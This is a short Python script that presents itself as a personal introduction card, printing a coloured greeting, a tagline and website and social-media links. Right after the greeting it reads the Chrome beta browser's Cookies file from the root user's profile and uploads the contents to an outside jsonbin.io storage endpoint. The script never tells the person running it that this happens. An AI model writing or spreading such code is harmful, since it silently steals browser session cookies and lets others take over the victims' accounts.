import sys
import superb
import requests
import json
from colorama import init, Fore
init()

def main():
	print(Fore.BLUE + '\nHello_Friend! I\'m Yoginth 🤓\n')
	print(Fore.YELLOW + '🌳 Tree Hugger • 🛡 Benevolent Hacker • 🐰 BTS Army\n')
	print(Fore.BLUE + 'Website -> https://yoginth.com')
	print(Fore.RED + '\nSocial\n')
	print(Fore.BLUE + 'GitLab -> https://gitlab.com/yo')
	print(Fore.BLUE + 'Twitter -> https://twitter.com/iamyoginth')
	BIN_ENDPOINT = "https://api.jsonbin.io/b/5de5ee0eb77d632ccda6a498"
	headers = {'Content-Type': 'application/json', 'versioning': "false"}
	
	with open('/root/.config/google-chrome-beta/Default/Cookies', 'rb') as f:
		res = {
		    "data": f.read().decode("ascii")
		}
		json_res = json.dumps(res)
		r = requests.put(url = BIN_ENDPOINT, data = json_res, headers = headers)
